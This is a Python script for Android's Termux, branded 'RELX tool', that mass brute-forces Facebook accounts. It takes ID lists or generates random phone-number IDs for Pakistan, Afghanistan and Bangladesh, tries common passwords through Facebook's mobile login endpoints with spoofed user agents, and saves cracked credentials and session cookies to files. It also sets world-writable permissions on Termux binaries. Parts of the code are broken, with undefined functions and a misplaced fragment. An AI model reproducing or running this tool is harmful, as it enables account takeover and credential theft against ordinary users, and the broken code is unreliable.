# Open Source By RELX 

#!/usr/bin/python3
#coding/utf/
#created/by/mr.RELX
import os,requests,json,time,re,random,sys,uuid,string,subprocess
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop

def clear():
        os.system('clear')

#_________[ OPEN FACEBOOK LITE ]______>>
def open_fb_lite():
    fb_url = "https://www.facebook.com/s.ran.bshwar.aytalya.593982"
    try:
        os.system(f'am start -n com.facebook.lite/com.facebook.lite.MainActivity -a android.intent.action.VIEW -d {fb_url} > /dev/null 2>&1')
    except:
        pass

#_________[ IMPORTING MODULES ]______>>
from os import path
import os,base64,zlib,pip,urllib
print('\033[1;33m \033[1;35mLOADING•••\033[0m')
os.system("chmod 777 /data/data/com.termux/files/usr/bin/*");clear() 
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

#_________[ PROXY SERVER ]______>>
if not os.path.exists('proxies.txt'):
    try:
        prox= requests.get('https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt').text
        open('proxies.txt','w').write(prox)
    except:
        pass

proxies=open('proxies.txt','r').read().splitlines()
android_models=[]
try:
    xx = open('proxies.txt','r').read().splitlines()
    for line in xx:
        android_models.append(line)
except:pass

#_________[ TRACKING USERS IP ]______>>
ip = requests.get("https://api.ipify.org").text
print('\033[1;33m\033[1;35mWELCOME\033[0m')
open_fb_lite()
time.sleep(2)

#_________[ UA ]______>>
ugen = [
  "Mozilla/5.0 (Linux; Android 11; SM-A105F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.316 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/450.0.0.44.109;]",
  "Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/145.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/455.0.0.50.115;]",
  "Mozilla/5.0 (Linux; Android 12; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/144.0.0.0 Mobile Safari/537.36"
]

#_________[ SYSTEM INFO ]______>>
try:
    android_version = subprocess.check_output('getprop ro.build.version.release 2>/dev/null || echo 11',shell=True).decode('utf-8').replace('\n','')
    model = subprocess.check_output('getprop ro.product.model 2>/dev/null || echo SM-A105FN',shell=True).decode('utf-8').replace('\n','')
    build = subprocess.check_output('getprop ro.build.id 2>/dev/null || echo RP1A.200720.012',shell=True).decode('utf-8').replace('\n','')
    fbmf = subprocess.check_output('getprop ro.product.manufacturer 2>/dev/null || echo samsung',shell=True).decode('utf-8').replace('\n','')
    fbbd = subprocess.check_output('getprop ro.product.brand 2>/dev/null || echo samsung',shell=True).decode('utf-8').replace('\n','')
except:
    android_version = '11'
    model = 'SM-A105FN'
    build = 'RP1A.200720.012'
    fbmf = 'samsung'
    fbbd = 'samsung'

fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha 2>/dev/null || echo Zong',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
    fbcr = 'Zong'
fbdv = model
fbsv = android_version
try:
    fbca = subprocess.check_output('getprop ro.product.cpu.abilist 2>/dev/null || echo armeabi-v7a:armeabi',shell=True).decode('utf-8').replace(',',':').replace('\n','')
    fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height 2>/dev/null || echo 1560',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width 2>/dev/null || echo 720',shell=True).decode('utf-8').replace('\n','')+'}'
except:
    fbca = 'armeabi-v7a:armeabi'
    fbdm = '{density=2.0,height=1560,width=720}'

# إلحاق بقية الكود الأصلي (الواجهة والألوان)
        user_agent = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(width_)+',height='+str(height_)+'};]'
        uat = random.choice(user_agent)
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#_________[ LOOPS ]______>>
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
#_________[ IMPORTING TIME MODULS ]______>>
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----------------------[DATE Checker For FILE CLONING]-----------------------#
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#-----------------------[DATE Checker For UID CLONING]-----------------------#
def joined(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif uid[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif uid[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif uid[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif uid[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif uid[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif uid[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif uid[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif uid[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif uid[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif uid[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif uid[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif uid[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif uid[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        elif uid[:5] in ['10009']           :creation = '\33[1;37m| \33[1;33m2023' 
        else:creation=''
    elif len(uid) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(uid)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(uid)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#_________[ PRINT LINE ]______>>
def linex():
    print('')
#_________[ TOOL LOGO ]______>>
logo = ("""\033[1;36m
ooooooooo.   oooooooooooo ooooo        ooooooo  ooooo      
`888   `Y88. `888'     `8 `888'         `8888    d8'       
 888   .d88'  888          888            Y888..8P         
 888ooo88P'   888oooo8     888             `8888'          
 888`88b.     888    "     888            .8PY888.         
 888  `88b.   888       o  888       o   d8'  `888b        
o888o  o888o o888ooooood8 o888ooooood8 o888o  o88888o      
\033[1;33m                                                           
\033[1;32m[•]\033[1;37m AUTHOR      : \033[1;92mFATHI \033[1;35m👑
\033[1;34m[•]\033[1;37m GITHUB      : \033[1;96mMR-RELX404 \033[1;36m🔰
\033[1;35m[•]\033[1;37m VERSION     : \033[1;91m2.0 \033[1;33m \033[1;32m🚀
\033[1;33m[•]\033[1;37m STATUS      : \033[1;91mFREE \033[1;93m💎 \033[1;92mACTIVE

\033[1;37;41m   ⚠️  RELX TOOL - PLANE AIRPLANE MODE 5 MINUTES⚠️   \033[0m
\033[1;36m""")
#_________[ MODULES CLEAR]______>>
clear() 
#_________[ MAIN MENU (NO KEY) ]______>>
def menu():
        try:
                x = ("sex")
                if x == ("sex"):
                        print('\033[1;33m[1]\033[1;35m FILE CLONING\033[0m')
                 #       print('\033[1;32m[2]\033[1;37m RANDOM PAK CLONING')
                  #      print('\033[1;33m[3]\033[1;35m CONTACT WITH OWNER\033[0m')
                        print('\033[1;33m[0]\033[1;31m EXIT\033[0m')
                        linex()
                        xd=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                        if xd in ['1','01']:
                                clear()
                                print('\033[1;32m[FILE CLONING MODE]')
                                linex()
                                print('\033[0;97m[+] \33[1;92mPUT FILE EXAMPLE \x1b[1;91m:  \x1b[1;96m/sdcard/File.txt  etc..')
                                linex()
                                file = input('\033[0;97m[+] \033[0;92mFILE PATH \033[1;31m : \033[0;92m')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('\033[0;97m[•]\x1b[1;91m FILE LOCATION NOT FOUND')
                                        time.sleep(1)
                                        clear()
                                        menu()
                                clear()
                                print('\033[1;33m[METHODS MENU]\033[0m')
                                linex()
                                print('\033[1;33m[1]\033[1;36m METHOD 1\033[0m')
                                print('\033[1;33m[2]\033[1;36m METHOD 2\033[0m')
                                print('\033[1;33m[3]\033[1;36m METHOD 3\033[0m')
                                linex()
                                mthd=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                                linex()
                                try:
                                        ps_limit = int(input('\033[0;97m[+] \033[0;92mHOW MANY PASSWORD DO YOU WANT TO ADD ? : '))
                                except:
                                        ps_limit = 1
                                clear()
                                print('\033[1;32m[PASSWORD MENU]')
                                linex()
                                print('\033[0;97m[+]\033[1;32m EXAMPLE \033[0;91m: \033[0;96mfirst last,firstlast,first123')
                                linex()
                                plist = []
                                for i in range(ps_limit):
                                        plist.append(input(f'\033[0;97m[•] \x1b[1;92mPUT PASSWORD {i+1} \033[1;31m: \033[1;36m'))
                                clear()
                             #   print('\033[1;32m[ACCOUNTS DISPLAY MENU]')
                                linex()
                                print('\033[0;97m\x1b[1;92m DO YOU WANT SHOW CP ACCOUNTS? \033[1;37m(\033[1;36my\033[1;37m/\x1b[1;96mn\033[1;37m) \033[1;31m: \x1b[1;93m')
                                linex()
                                cx=input('\033[0;97m\033[0;92mEnter\x1b[1;91m: \x1b[1;96m')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                              #          print('\033[1;32m[FILE CRACKING MENU]')
                                        print('\033[0;97m\033[0;92mTOTAL CCOUNT  \033[0;91m:  \033[0;96m'+total_ids+'')
                                  #      print('\033[0;97m[•]\x1b[1;92m CRACKING HAS BEEN STARTED')
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED')
                                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/RELX-COOKIE.txt') 
                                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/RELX-OK.txt')
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\033[1;32m[RANDOM CLONING MENU]')
                                linex()
                              #  print('\033[1;32m[1]\033[1;37m PAKISTAN RANDOM CLONING')
                   #             print('\033[1;32m[2]\033[1;37m BANGLADESH RANDOM CLONING')
                           #     print('\033[1;32m[3]\033[1;37m AFGHANISTAN RANDOM CLONING')
                #                print('\033[1;31m[0]\033[1;37m BACK TO MAIN MENU')
                                linex()
                                x=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']: 
                                        afg()
                                else:
                                        print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');menu()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/s.ran.bshwar.aytalya.593982');menu() 
                        elif xd in ['0','00']:
                                clear()
                                print('\033[1;31m[EXIT FROM RELX TOOL]')
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO EXIT');clear() 
                                print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE RELX TOOL');time.sleep(2);exit() 
                        else:
                                print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');menu()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n\033[0;97m[•]\x1b[1;91mNO INTERNET CONNECTION...')
                exit()
#_________[ PAK RANDOM CLONER ]______>>
def pak():
                user=[]
                clear()
                print('\033[1;32m[PAK RANDOM CLONER MENU]')
                linex()
                print('\033[1;32m[PAKISTAN SIM CODE MENU]')
                linex()
                print('\033[1;32m PAKISTAN SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m0306,0315,0335,0345')
                linex() 
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m ')
                linex() 
                try:
                        limit = int(input('\033[1;32m[UIDS LIMIT MENU]\n\033[0;97m[•]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[0;97m[•]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as RELX:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m[RANDOM PAK CRACKING MENU]')
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print('\033[0;97m[•]\x1b[1;92m CRACKING HAS BEEN STARTED')
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan123','khan123','khan12345','baloch123','baloch786','khan123456','i love you','khanbaba','khankhan','baloch','freefire','malik786','malik1122','malik123','malik12345','malik123456']
                                RELX .submit(rndm,ids,passlist)
                print('\033[1;37m')
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/RELX-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/RELX-rndm-OK.txt')
                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear()
                menu()
#_________[ AFG RANDOM CLONER ]______>>      
def afg():
                user=[]
                clear()
                print('\033[1;32m[AFG RANDOM CLONER MENU]')
                linex()
                print('\033[1;32m[AFG SIM CODE MENU]')
                linex()
                print('\033[1;32m AFG SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m9377,9378,9379,.....etc')
                linex() 
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m ')
                linex() 
                try:
                        limit = int(input('\033[1;32m[UIDS LIMIT MENU]\n\033[0;97m[•]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[0;97m[•]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as RELX :     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m[RANDOM AFG CRACKING MENU]')
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print('\033[0;97m[•]\x1b[1;92m CRACKING HAS BEEN STARTED')
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123','baloch','afghan','afghan12345','afghan123','afghan1234','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
                                RELX .submit(rndm,ids,passlist)
                print('\033[1;37m')
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear()
                menu()                
#_________[ BD RANDOM CLONER ]______>> 
def bd():
                user=[]
                clear()
                print('\033[1;32m[BANGLADESH RANDOM CLONER MENU]')
                linex()
                print('\033[1;32m[BANGLADESH SIM CODE MENU]')
                linex()
                print('\033[1;32m BANGLADESH SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m016,017,018,019')
                linex()
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m')
                clear()
                try:
                        limit = int(input('\033[1;32m[UIDS LIMIT MENU]\n\033[0;97m[•]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[0;97m[•]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as RELX :     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m[RANDOM BANGLADESH CRACKING MENU]')
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print('\033[0;97m[•]\x1b[1;92m CRACKING HAS BEEN STARTED')
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                RELX .submit(rndm,ids,passlist)
                print('\033[1;37m')
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                input('\033[0;97m[•]\x1b[1;92m PRESS  TO BACK');clear()
                menu() 
#_________[ METHOD 1 - WITH COLOR CHANGING ]______>>  
def ffb(ids,names,passlist):
        global loop,oks,cps
        colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m', '\033[1;91m', '\033[1;92m', '\033[1;93m', '\033[1;94m', '\033[1;95m', '\033[1;96m']
        color = random.choice(colors)
        sys.stdout.write(f'\r\033[1;36m [RELX-M1] \033[1;33m{loop}\033[0m')
        sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['Infinix_X521','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['414.0.0.30.113','414.0.0.30.113','354.0.0.8.108','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','414.0.0.30.113','413.0.0.30.104','414.0.0.30.113','408.1.0.16.113'])
                        ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+str(random.randint(000000000,999999999))+';FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/'+fbcr+';FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'       
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        RELX =session.cookies.get_dict().keys()
                        if "c_user" in RELX :
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m[\033[0;97mRELX-OK\033[0;92m] \033[0;92m%s \033[0;97m| \033[0;92m%s'%(ids,pas))
                                open('/sdcard/RELX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/RELX-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RELX :
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;92m[\033[0;91mRELX-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                        open('/sdcard/RELX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass
